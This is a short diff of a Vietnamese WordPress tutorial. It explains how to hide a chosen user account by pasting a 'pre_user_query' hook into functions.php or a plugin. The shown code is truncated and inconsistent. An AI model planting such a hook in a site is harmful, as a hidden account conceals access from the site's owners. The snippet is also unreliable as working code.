@@ -2,7 +2,7 @@
 
 - Trước tiên, tạo user muốn ẩn ( Ví dụ user mình tạo là admin1, thì điền vào code dưới là admin ). Sau đó copy đoạn code dưới vào bất kỳ chỗ nào trong wordpress (function.php, *plugins,...).
 
-add_action('pre_user_query','yoursite_pre_user_query');
+> add_action('pre_user_query','yoursite_pre_user_query');
 function yoursite_pre_user_query($user_search) {
 global $current_user;
 if ($username == 'admin1') {
